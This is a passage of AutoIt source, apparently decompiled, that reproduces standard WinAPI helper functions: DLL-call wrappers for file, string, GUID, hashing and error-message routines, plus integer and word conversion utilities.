    If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, False)
    Local $acall = DllCall("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0x0], "bool*", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, False)
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_ISWOW64PROCESS
Func _WinAPI_LoadImage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
    Local $acall, $simagetype = "int"
    If IsString($simage) Then $simagetype = "wstr"
    $acall = DllCall("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOADIMAGE
Func _WinAPI_LoadLibrary($sfilename)
    Local $acall = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOADLIBRARY
Func _WinAPI_PathIsDirectory($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISDIRECTORY
Func _WinAPI_ReadFile($hfile, $pbuffer, $itoread, ByRef $iread, $toverlapped = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itoread, "dword*", 0x0, "struct*", $toverlapped)
    If @error Then Return SetError(@error, @extended, False)
    $iread = $acall[0x4]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_READFILE
Func _WinAPI_StrLen($pstring, $bunicode = True)
    Local $w = ""
    If $bunicode Then $w = "W"
    Local $acall = DllCall("kernel32.dll", "int", "lstrlen" & $w, "struct*", $pstring)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_STRLEN
Func _WinAPI_SwitchColor($icolor)
    If $icolor = +0xffffffff Then Return $icolor
    Return BitOR(BitAND($icolor, 0xff00), BitShift(BitAND($icolor, 0xff), +0xfffffff0), BitShift(BitAND($icolor, 0xff0000), 0x10))
EndFunc   ;==>_WINAPI_SWITCHCOLOR
Func _WinAPI_WriteFile($hfile, $pbuffer, $itowrite, ByRef $iwritten, $toverlapped = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "struct*", $pbuffer, "dword", $itowrite, "dword*", 0x0, "struct*", $toverlapped)
    If @error Then Return SetError(@error, @extended, False)
    $iwritten = $acall[0x4]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_WRITEFILE
#EndRegion Public Functions
#Region Internal Functions
Func __CHECKERRORARRAYBOUNDS(Const ByRef $adata, ByRef $istart, ByRef $iend, $ndim = 0x1, $idim = $ubound_dimensions)
    If Not IsArray($adata) Then Return SetError(0x1, 0x0, 0x1)
    If UBound($adata, $idim) <> $ndim Then Return SetError(0x2, 0x0, 0x1)
    If $istart < 0x0 Then $istart = 0x0
    Local $iubound = UBound($adata) + 0xffffffff
    If $iend < 0x1 Or $iend > $iubound Then $iend = $iubound
    If $istart > $iend Then Return SetError(0x4, 0x0, 0x1)
    Return 0x0
EndFunc   ;==>__CHECKERRORARRAYBOUNDS
Func __CHECKERRORCLOSEHANDLE($acall, $hfile, $blasterror = False, $icurerr = @error, $icurext = @extended)
    If Not $icurerr And Not $acall[0x0] Then $icurerr = 0xa
    Local $alasterror = DllCall("kernel32.dll", "dword", "GetLastError")
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
    If $icurerr Then DllCall("kernel32.dll", "none", "SetLastError", "dword", $alasterror[0x0])
    If $blasterror Then $icurext = $alasterror[0x0]
    Return SetError($icurerr, $icurext, $icurerr)
EndFunc   ;==>__CHECKERRORCLOSEHANDLE
Func __DLL($spath, $bpin = False)
    Local $acall = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", ($bpin ? 0x1 : 0x2), "wstr", $spath, "ptr*", 0x0)
    If Not $acall[0x3] Then
        $acall = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
        If @error Or Not $acall[0x0] Then Return 0x0
    EndIf
    Return 0x1
EndFunc   ;==>__DLL
Func __ENUMWINDOWSPROC($hwnd, $bvisible)
    Local $acall
    If $bvisible Then
        $acall = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
        If Not $acall[0x0] Then
            Return 0x1
        EndIf
    EndIf
    __INC($__g_venum)
    $__g_venum[$__g_venum[0x0][0x0]][0x0] = $hwnd
    $acall = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 0x1000)
    $__g_venum[$__g_venum[0x0][0x0]][0x1] = $acall[0x2]
    Return 0x1
EndFunc   ;==>__ENUMWINDOWSPROC
Func __FATALEXIT($icode, $stext = "")
    If $stext Then MsgBox($mb_systemmodal, "AutoIt", $stext)
    DllCall("kernel32.dll", "none", "FatalExit", "int", $icode)
EndFunc   ;==>__FATALEXIT
Func __INC(ByRef $adata, $iincrement = 0x64)
    Select
        Case UBound($adata, $ubound_columns)
            If $iincrement < 0x0 Then
                ReDim $adata[$adata[0x0][0x0] + 0x1][UBound($adata, $ubound_columns)]
            Else
                $adata[0x0][0x0] += 0x1
                If $adata[0x0][0x0] > UBound($adata) + 0xffffffff Then
                    ReDim $adata[$adata[0x0][0x0] + $iincrement][UBound($adata, $ubound_columns)]
                EndIf
            EndIf
        Case UBound($adata, $ubound_rows)
            If $iincrement < 0x0 Then
                ReDim $adata[$adata[0x0] + 0x1]
            Else
                $adata[0x0] += 0x1
                If $adata[0x0] > UBound($adata) + 0xffffffff Then
                    ReDim $adata[$adata[0x0] + $iincrement]
                EndIf
            EndIf
        Case Else
            Return 0x0
    EndSelect
    Return 0x1
EndFunc   ;==>__INC
Func __RGB($icolor)
    If $__g_irgbmode Then
        $icolor = _WinAPI_SwitchColor($icolor)
    EndIf
    Return $icolor
EndFunc   ;==>__RGB
#EndRegion Internal Functions
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_CharToOem($sstr)
    Local $acall, $sretstr = "", $nlen = StringLen($sstr) + 0x1, $istart = 0x1
    While $istart < $nlen
        $acall = DllCall("user32.dll", "bool", "CharToOemW", "wstr", StringMid($sstr, $istart, 0x10000), "wstr", "")
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
        $istart += 0x10000
        $sretstr &= $acall[0x2]
    WEnd
    Return $sretstr
EndFunc   ;==>_WINAPI_CHARTOOEM
Func _WinAPI_ClientToScreen($hwnd, ByRef $tpoint)
    Local $acall = DllCall("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Return $tpoint
EndFunc   ;==>_WINAPI_CLIENTTOSCREEN
Func _WinAPI_DWordToFloat($ivalue)
    Local $tdword = DllStructCreate("dword")
    Local $tfloat = DllStructCreate("float", DllStructGetPtr($tdword))
    DllStructSetData($tdword, 0x1, $ivalue)
    Return DllStructGetData($tfloat, 0x1)
EndFunc   ;==>_WINAPI_DWORDTOFLOAT
Func _WinAPI_DWordToInt($ivalue)
    Local $tdata = DllStructCreate("int")
    DllStructSetData($tdata, 0x1, $ivalue)
    Return DllStructGetData($tdata, 0x1)
EndFunc   ;==>_WINAPI_DWORDTOINT
Func _WinAPI_FloatToDWord($ivalue)
    Local $tfloat = DllStructCreate("float")
    Local $tdword = DllStructCreate("dword", DllStructGetPtr($tfloat))
    DllStructSetData($tfloat, 0x1, $ivalue)
    Return DllStructGetData($tdword, 0x1)
EndFunc   ;==>_WINAPI_FLOATTODWORD
Func _WinAPI_FloatToInt($nfloat)
    Local $tfloat = DllStructCreate("float")
    Local $tint = DllStructCreate("int", DllStructGetPtr($tfloat))
    DllStructSetData($tfloat, 0x1, $nfloat)
    Return DllStructGetData($tint, 0x1)
EndFunc   ;==>_WINAPI_FLOATTOINT
Func _WinAPI_GetXYFromPoint(ByRef $tpoint, ByRef $ix, ByRef $iy)
    $ix = DllStructGetData($tpoint, "X")
    $iy = DllStructGetData($tpoint, "Y")
EndFunc   ;==>_WINAPI_GETXYFROMPOINT
Func _WinAPI_GUIDFromString($sguid)
    Local $tguid = DllStructCreate($tagguid)
    If Not _WinAPI_GUIDFromStringEx($sguid, $tguid) Then Return SetError(@error, @extended, 0x0)
    Return $tguid
EndFunc   ;==>_WINAPI_GUIDFROMSTRING
Func _WinAPI_GUIDFromStringEx($sguid, $tguid)
    Local $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
    If @error Then Return SetError(@error, @extended, False)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], False)
    Return True
EndFunc   ;==>_WINAPI_GUIDFROMSTRINGEX
Func _WinAPI_HashData($pmemory, $isize, $ilength = 0x20)
    If ($ilength <= 0x0) Or ($ilength > 0x100) Then Return SetError(0xb, 0x0, 0x0)
    Local $tdata = DllStructCreate("byte[" & $ilength & "]")
    Local $acall = DllCall("shlwapi.dll", "uint", "HashData", "struct*", $pmemory, "dword", $isize, "struct*", $tdata, "dword", $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return DllStructGetData($tdata, 0x1)
EndFunc   ;==>_WINAPI_HASHDATA
Func _WinAPI_HashString($sstring, $bcasesensitive = True, $ilength = 0x20)
    Local $ilengths = StringLen($sstring)
    If Not $ilengths Or ($ilength > 0x100) Then Return SetError(0xc, 0x0, 0x0)
    Local $tstring = DllStructCreate("wchar[" & ($ilengths + 0x1) & "]")
    If Not $bcasesensitive Then
        $sstring = StringLower($sstring)
    EndIf
    DllStructSetData($tstring, 0x1, $sstring)
    Local $shash = _WinAPI_HashData($tstring, 0x2 * $ilengths, $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $shash
EndFunc   ;==>_WINAPI_HASHSTRING
Func _WinAPI_HiByte($ivalue)
    Return BitAND(BitShift($ivalue, 0x8), 0xff)
EndFunc   ;==>_WINAPI_HIBYTE
Func _WinAPI_HiDWord($ivalue)
    Local $tint64 = DllStructCreate("int64")
    Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
    DllStructSetData($tint64, 0x1, $ivalue)
    Return DllStructGetData($tqword, 0x2)
EndFunc   ;==>_WINAPI_HIDWORD
Func _WinAPI_HiWord($ilong)
    Return BitShift($ilong, 0x10)
EndFunc   ;==>_WINAPI_HIWORD
Func _WinAPI_IntToDWord($ivalue)
    Local $tdata = DllStructCreate("dword")
    DllStructSetData($tdata, 0x1, $ivalue)
    Return DllStructGetData($tdata, 0x1)
EndFunc   ;==>_WINAPI_INTTODWORD
Func _WinAPI_IntToFloat($iint)
    Local $tint = DllStructCreate("int")
    Local $tfloat = DllStructCreate("float", DllStructGetPtr($tint))
    DllStructSetData($tint, 0x1, $iint)
    Return DllStructGetData($tfloat, 0x1)
EndFunc   ;==>_WINAPI_INTTOFLOAT
Func _WinAPI_LoByte($ivalue)
    Return BitAND($ivalue, 0xff)
EndFunc   ;==>_WINAPI_LOBYTE
Func _WinAPI_LoDWord($ivalue)
    Local $tint64 = DllStructCreate("int64")
    Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
    DllStructSetData($tint64, 0x1, $ivalue)
    Return DllStructGetData($tqword, 0x1)
EndFunc   ;==>_WINAPI_LODWORD
Func _WinAPI_LoWord($ilong)
    Return BitAND($ilong, 0xffff)
EndFunc   ;==>_WINAPI_LOWORD
Func _WinAPI_LongMid($ivalue, $istart, $icount)
    Return BitAND(BitShift($ivalue, $istart), BitOR(BitShift(BitShift(0x7fffffff, 0x20 - ($icount + 0x1)), 0x1), BitShift(0x1, -($icount + 0xffffffff))))
EndFunc   ;==>_WINAPI_LONGMID
Func _WinAPI_MAKELANGID($ilngidprimary, $ilngidsub)
    Return BitOR(BitShift($ilngidsub, +0xfffffff6), $ilngidprimary)
EndFunc   ;==>_WINAPI_MAKELANGID
Func _WinAPI_MAKELCID($ilngid, $isortid)
    Return BitOR(BitShift($isortid, +0xfffffff0), $ilngid)
EndFunc   ;==>_WINAPI_MAKELCID
Func _WinAPI_MakeLong($ilo, $ihi)
    Return BitOR(BitShift($ihi, +0xfffffff0), BitAND($ilo, 0xffff))
EndFunc   ;==>_WINAPI_MAKELONG
Func _WinAPI_MakeQWord($ilodword, $ihidword)
    Local $tint64 = DllStructCreate("uint64")
    Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
    DllStructSetData($tdwords, 0x1, $ilodword)
    DllStructSetData($tdwords, 0x2, $ihidword)
    Return DllStructGetData($tint64, 0x1)
EndFunc   ;==>_WINAPI_MAKEQWORD
Func _WinAPI_MakeWord($ilo, $ihi)
    Local $tword = DllStructCreate("ushort")
    Local $tbyte = DllStructCreate("byte;byte", DllStructGetPtr($tword))
    DllStructSetData($tbyte, 0x1, $ihi)
    DllStructSetData($tbyte, 0x2, $ilo)
    Return DllStructGetData($tword, 0x1)
EndFunc   ;==>_WINAPI_MAKEWORD
Func _WinAPI_MultiByteToWideChar($vtext, $icodepage = 0x0, $iflags = 0x0, $bretstring = False)
    Local $stexttype = ""
    If IsString($vtext) Then $stexttype = "str"
    If (IsDllStruct($vtext) Or IsPtr($vtext)) Then $stexttype = "struct*"
    If $stexttype = "" Then Return SetError(0x1, 0x0, 0x0)
    Local $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", +0xffffffff, "ptr", 0x0, "int", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $iout = $acall[0x0]
    Local $tout = DllStructCreate("wchar[" & $iout & "]")
    $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", +0xffffffff, "struct*", $tout, "int", $iout)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
    If $bretstring Then Return DllStructGetData($tout, 0x1)
    Return $tout
EndFunc   ;==>_WINAPI_MULTIBYTETOWIDECHAR
Func _WinAPI_MultiByteToWideCharEx($stext, $ptext, $icodepage = 0x0, $iflags = 0x0)
    Local $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", +0xffffffff, "struct*", $ptext, "int", (StringLen($stext) + 0x1) * 0x2)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_MULTIBYTETOWIDECHAREX
Func _WinAPI_OemToChar($sstr)
    Local $acall, $sretstr = "", $nlen = StringLen($sstr) + 0x1, $istart = 0x1
    While $istart < $nlen
        $acall = DllCall("user32.dll", "bool", "OemToCharA", "str", StringMid($sstr, $istart, 0x10000), "str", "")
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
        $sretstr &= $acall[0x2]
        $istart += 0x10000
    WEnd
    Return $sretstr
EndFunc   ;==>_WINAPI_OEMTOCHAR
Func _WinAPI_PointFromRect(ByRef $trect, $bcenter = True)
    Local $ix1 = DllStructGetData($trect, "Left")
    Local $iy1 = DllStructGetData($trect, "Top")
    Local $ix2 = DllStructGetData($trect, "Right")
    Local $iy2 = DllStructGetData($trect, "Bottom")
    If $bcenter Then
        $ix1 = $ix1 + (($ix2 - $ix1) / 0x2)
        $iy1 = $iy1 + (($iy2 - $iy1) / 0x2)
    EndIf
    Local $tpoint = DllStructCreate($tagpoint)
    DllStructSetData($tpoint, "X", $ix1)
    DllStructSetData($tpoint, "Y", $iy1)
    Return $tpoint
EndFunc   ;==>_WINAPI_POINTFROMRECT
Func _WinAPI_PrimaryLangId($ilngid)
    Return BitAND($ilngid, 0x3ff)
EndFunc   ;==>_WINAPI_PRIMARYLANGID
Func _WinAPI_ScreenToClient($hwnd, ByRef $tpoint)
    Local $acall = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SCREENTOCLIENT
Func _WinAPI_ShortToWord($ivalue)
    Return BitAND($ivalue, 0xffff)
EndFunc   ;==>_WINAPI_SHORTTOWORD
Func _WinAPI_StrFormatByteSize($isize)
    Local $acall = DllCall("shlwapi.dll", "ptr", "StrFormatByteSizeW", "int64", $isize, "wstr", "", "uint", 0x400)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_STRFORMATBYTESIZE
Func _WinAPI_StrFormatByteSizeEx($isize)
    Local $asymbol = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 0x400, "dword", 0xf, "wstr", "", "int", 0x800)
    If @error Then Return SetError(@error + 0xa, @extended, "")
    Local $ssize = _WinAPI_StrFormatByteSize(0x0)
    If @error Then Return SetError(@error, @extended, "")
    Return StringReplace($ssize, "0", StringRegExpReplace(Number($isize), "(?<=\d)(?=(\d{3})+\z)", $asymbol[0x3]))
EndFunc   ;==>_WINAPI_STRFORMATBYTESIZEEX
Func _WinAPI_StrFormatKBSize($isize)
    Local $acall = DllCall("shlwapi.dll", "ptr", "StrFormatKBSizeW", "int64", $isize, "wstr", "", "uint", 0x400)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_STRFORMATKBSIZE
Func _WinAPI_StrFromTimeInterval($itime, $idigits = 0x7)
    Local $acall = DllCall("shlwapi.dll", "int", "StrFromTimeIntervalW", "wstr", "", "uint", 0x400, "dword", $itime, "int", $idigits)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return StringStripWS($acall[0x1], $str_stripleading + $str_striptrailing)
EndFunc   ;==>_WINAPI_STRFROMTIMEINTERVAL
Func _WinAPI_StringFromGUID($tguid)
    Local $acall = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 0x28)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return SetExtended($acall[0x0], $acall[0x2])
EndFunc   ;==>_WINAPI_STRINGFROMGUID
Func _WinAPI_SubLangId($ilngid)
    Return BitShift($ilngid, 0xa)
EndFunc   ;==>_WINAPI_SUBLANGID
Func _WinAPI_SwapDWord($ivalue)
    Local $tstruct1 = DllStructCreate("dword;dword")
    Local $tstruct2 = DllStructCreate("byte[4];byte[4]", DllStructGetPtr($tstruct1))
    DllStructSetData($tstruct1, 0x1, $ivalue)
    For $i = 0x1 To 0x4
        DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x5 - $i), $i)
    Next
    Return DllStructGetData($tstruct1, 0x2)
EndFunc   ;==>_WINAPI_SWAPDWORD
Func _WinAPI_SwapQWord($ivalue)
    Local $tstruct1 = DllStructCreate("int64;int64")
    Local $tstruct2 = DllStructCreate("byte[8];byte[8]", DllStructGetPtr($tstruct1))
    DllStructSetData($tstruct1, 0x1, $ivalue)
    For $i = 0x1 To 0x8
        DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x9 - $i), $i)
    Next
    Return DllStructGetData($tstruct1, 0x2)
EndFunc   ;==>_WINAPI_SWAPQWORD
Func _WinAPI_SwapWord($ivalue)
    Local $tstruct1 = DllStructCreate("word;word")
    Local $tstruct2 = DllStructCreate("byte[2];byte[2]", DllStructGetPtr($tstruct1))
    DllStructSetData($tstruct1, 0x1, $ivalue)
    For $i = 0x1 To 0x2
        DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x3 - $i), $i)
    Next
    Return DllStructGetData($tstruct1, 0x2)
EndFunc   ;==>_WINAPI_SWAPWORD
Func _WinAPI_WideCharToMultiByte($vunicode, $icodepage = 0x0, $bretnostruct = True, $bretbinary = False)
    Local $sunicodetype = "wstr"
    If Not IsString($vunicode) Then $sunicodetype = "struct*"
    Local $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0x0, $sunicodetype, $vunicode, "int", +0xffffffff, "ptr", 0x0, "int", 0x0, "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, "")
    Local $tmultibyte = DllStructCreate((($bretbinary) ? ("byte") : ("char")) & "[" & $acall[0x0] & "]")
    $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0x0, $sunicodetype, $vunicode, "int", +0xffffffff, "struct*", $tmultibyte, "int", $acall[0x0], "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    If $bretnostruct Then Return DllStructGetData($tmultibyte, 0x1)
    Return $tmultibyte
EndFunc   ;==>_WINAPI_WIDECHARTOMULTIBYTE
Func _WinAPI_WordToShort($ivalue)
    If BitAND($ivalue, 0x8000) Then
        Return BitOR($ivalue, 0xffff8000)
    EndIf
    Return BitAND($ivalue, 0x7fff)
EndFunc   ;==>_WINAPI_WORDTOSHORT
#EndRegion Public Functions
#Region Global Variables and Constants
Global Const $format_message_allocate_buffer = 0x100
Global Const $format_message_ignore_inserts = 0x200
Global Const $format_message_from_string = 0x400
Global Const $format_message_from_hmodule = 0x800
Global Const $format_message_from_system = 0x1000
Global Const $format_message_argument_array = 0x2000
#EndRegion Global Variables and Constants
Func _WinAPI_Beep($ifreq = 0x1f4, $iduration = 0x3e8)
    Local $acall = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_BEEP
Func _WinAPI_FormatMessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
    Local $sbuffertype = "struct*"
    If IsString($pbuffer) Then $sbuffertype = "wstr"
    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "struct*", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
    If @error Then Return SetError(@error, @extended, 0x0)
    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    If $sbuffertype = "wstr" Then $pbuffer = $acall[0x5]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FORMATMESSAGE
Func _WinAPI_GetErrorMessage($icode, $ilanguage = 0x0, Const $_icallererror = @error, Const $_icallerextended = @extended)
    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", BitOR($format_message_from_system, $format_message_ignore_inserts), "ptr", 0x0, "dword", $icode, "dword", $ilanguage, "wstr", "", "dword", 0x1000, "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return SetError($_icallererror, $_icallerextended, StringRegExpReplace($acall[0x5], "[" & @LF & "," & @CR & "]*\Z", ""))
EndFunc   ;==>_WINAPI_GETERRORMESSAGE
Func _WinAPI_GetLastError(Const $_icallererror = @error, Const $_icallerextended = @extended)
    Local $acall = DllCall("kernel32.dll", "dword", "GetLastError")
    Return SetError($_icallererror, $_icallerextended, $acall[0x0])
EndFunc   ;==>_WINAPI_GETLASTERROR
Func _WinAPI_GetLastErrorMessage(Const $_icallererror = @error, Const $_icallerextended = @extended)
    Local $ilasterror = _WinAPI_GetLastError()
    Local $tbufferptr = DllStructCreate("ptr")
    Local $ncount = _WinAPI_FormatMessage(BitOR($format_message_allocate_buffer, $format_message_from_system, $format_message_ignore_inserts), 0x0, $ilasterror, 0x0, $tbufferptr, 0x0, 0x0)
    If @error Then Return SetError(-@error, @extended, "")
    Local $stext = ""
    Local $pbuffer = DllStructGetData($tbufferptr, 0x1)
    If $pbuffer Then
        If $ncount > 0x0 Then
            Local $tbuffer = DllStructCreate("wchar[" & ($ncount + 0x1) & "]", $pbuffer)
            $stext = DllStructGetData($tbuffer, 0x1)
            If StringRight($stext, 0x2) = @CRLF Then $stext = StringTrimRight($stext, 0x2)
        EndIf
        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pbuffer)
    EndIf
    Return SetError($_icallererror, $_icallerextended, $stext)
EndFunc   ;==>_WINAPI_GETLASTERRORMESSAGE
Func _WinAPI_MessageBeep($itype = 0x1)
    Local $isound
    Switch $itype
        Case 0x1
            $isound = 0x0
        Case 0x2
            $isound = 0x10
        Case 0x3
            $isound = 0x20
        Case 0x4
            $isound = 0x30
        Case 0x5
            $isound = 0x40
        Case Else
            $isound = +0xffffffff
    EndSwitch
    Local $acall = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_MESSAGEBEEP
Func _WinAPI_MsgBox($iflags, $stitle, $stext)
    BlockInput(0x0)
    MsgBox($iflags, $stitle, $stext & "      ")
EndFunc   ;==>_WINAPI_MSGBOX
Func _WinAPI_SetLastError($ierrorcode, Const $_icallererror = @error, Const $_icallerextended = @extended)
    DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
    Return SetError($_icallererror, $_icallerextended, Null)
EndFunc   ;==>_WINAPI_SETLASTERROR
Func _WinAPI_ShowError($stext, $bexit = True)
    BlockInput(0x0)
    MsgBox($mb_systemmodal, "Error", $stext & "      ")
    If $bexit Then Exit
EndFunc   ;==>_WINAPI_SHOWERROR
Func _WinAPI_ShowLastError($stext = "", $babort = False, $ilanguage = 0x0, Const $_icallererror = @error, Const $_icallerextended = @extended)
    Local $serror
    Local $ilasterror = _WinAPI_GetLastError()
    While 0x1
        $serror = _WinAPI_GetErrorMessage($ilasterror, $ilanguage)
        If @error And $ilanguage Then
            $ilanguage = 0x0
        Else
            ExitLoop
        EndIf
    WEnd
    If StringStripWS($stext, $str_stripleading + $str_striptrailing) Then
        $stext &= @CRLF & @CRLF
    Else
        $stext = ""
    EndIf
    _WinAPI_MsgBox(BitOR(0x40000, BitShift(0x10, +0xfffffffe * (Not $ilasterror))), $ilasterror, $stext & $serror)
    If $ilasterror Then
        _WinAPI_SetLastError($ilasterror)
        If $babort Then
            Exit $ilasterror
        EndIf
    EndIf
    Return SetError($_icallererror, $_icallerextended, 0x1)
EndFunc   ;==>_WINAPI_SHOWLASTERROR
Func _WinAPI_ShowMsg($stext)
    _WinAPI_MsgBox($mb_systemmodal, "Information", $stext)
EndFunc   ;==>_WINAPI_SHOWMSG
Func __COMERRORFORMATING(ByRef $ocomerror, $sprefix = @TAB)
    Local Const $str_striptrailing = 0x2
    Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror .Scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror .Number, 0x8) & " (" & $ocomerror .Number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror .WinDescription, $str_striptrailing) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror .Description, $str_striptrailing) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror .Source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror .HelpFile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror .HelpContext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror .LastDllError & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror .retcode)
    Return $serror
EndFunc   ;==>__COMERRORFORMATING
#Region Global Variables and Constants
Global $__g_hheap = 0x0
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
Func _WinAPI_CreateBuffer($ilength, $pbuffer = 0x0, $babort = True)
    $pbuffer = __HEAPREALLOC($pbuffer, $ilength, 0x0, $babort)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $pbuffer
EndFunc   ;==>_WINAPI_CREATEBUFFER
Func _WinAPI_CreateBufferFromStruct($tstruct, $pbuffer = 0x0, $babort = True)
    If Not IsDllStruct($tstruct) Then Return SetError(0x1, 0x0, 0x0)
    $pbuffer = __HEAPREALLOC($pbuffer, DllStructGetSize($tstruct), 0x0, $babort)
    If @error Then Return SetError(@error + 0x64, @extended, 0x0)
    _WinAPI_MoveMemory($pbuffer, $tstruct, DllStructGetSize($tstruct))
    Return $pbuffer
EndFunc   ;==>_WINAPI_CREATEBUFFERFROMSTRUCT
Func _WinAPI_CreateString($sstring, $pstring = 0x0, $ilength = +0xffffffff, $bunicode = True, $babort = True)
    $ilength = Number($ilength)
    If $ilength >= 0x0 Then
        $sstring = StringLeft($sstring, $ilength)
    Else
        $ilength = StringLen($sstring)
    EndIf
    Local $isize = $ilength + 0x1
    If $bunicode Then
        $isize *= 0x2
    EndIf
    $pstring = __HEAPREALLOC($pstring, $isize, 0x0, $babort)
    If @error Then Return SetError(@error, @extended, 0x0)
    DllStructSetData(DllStructCreate(($bunicode ? "wchar" : "char") & "[" & ($ilength + 0x1) & "]", $pstring), 0x1, $sstring)
    Return SetExtended($ilength, $pstring)
EndFunc   ;==>_WINAPI_CREATESTRING
Func _WinAPI_EqualMemory($psource1, $psource2, $ilength)
    If _WinAPI_IsBadReadPtr($psource1, $ilength) Then Return SetError(0xb, @extended, 0x0)
